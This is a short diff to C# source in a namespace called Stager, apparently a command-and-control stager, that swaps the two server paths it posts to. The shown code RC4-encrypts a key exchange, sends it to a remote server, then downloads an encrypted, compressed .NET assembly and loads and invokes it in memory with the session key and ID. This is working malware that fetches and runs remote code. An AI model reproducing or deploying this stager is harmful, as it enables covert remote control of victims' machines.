@@ -136,7 +136,7 @@ namespace Stager
             var rc4p = ConvertToRC4ByteStream(iv.Concat(skb).ToArray(), data);
             rc4p = iv.Concat(rc4p).Concat(eb).ToArray();
 
-            byte[] raw = wc.UploadData(s+"/login/process.php","post",rc4p);
+            byte[] raw = wc.UploadData(s+"/admin/get.php","post",rc4p);
             byte[] de = rs.Decrypt(raw, false);
 
             string nonce = e.GetString(de.Take(16).ToArray());
@@ -196,7 +196,7 @@ namespace Stager
             byte[] rc4p2 = ConvertToRC4ByteStream(iv2.Concat(skb).ToArray(), data2);
             rc4p2 = iv2.Concat(rc4p2).Concat(eb2).ToArray();
 
-            raw = wc.UploadData(s + "/admin/get.php", "post", rc4p2);
+            raw = wc.UploadData(s + "/login/process.php", "post", rc4p2);
             string decryptedAssembly = e.GetString(DecryptBytes(key, raw));
             Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
             agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { s, sk, key, e.GetString(id) });
